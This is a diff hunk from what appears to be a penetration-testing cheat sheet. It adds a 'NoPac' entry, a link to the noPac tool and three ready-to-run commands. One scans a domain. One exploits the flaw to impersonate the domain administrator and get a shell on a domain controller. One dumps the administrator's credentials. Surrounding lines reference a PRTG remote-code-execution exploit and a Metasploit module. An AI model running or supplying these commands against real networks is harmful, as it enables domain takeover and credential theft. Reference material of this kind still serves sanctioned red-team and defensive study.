@@ -839,6 +839,15 @@ https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
 use exploit/windows/http/prtg_authenticated_rce
 ```
 
+- NoPac
+
+```
+https://github.com/Ridter/noPac
+$ sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <IP address> -use-ldap
+$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> -shell --impersonate administrator -use-ldap
+$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
+```
+
 #4. - Lateral Movement
 -----------------------------------------
 
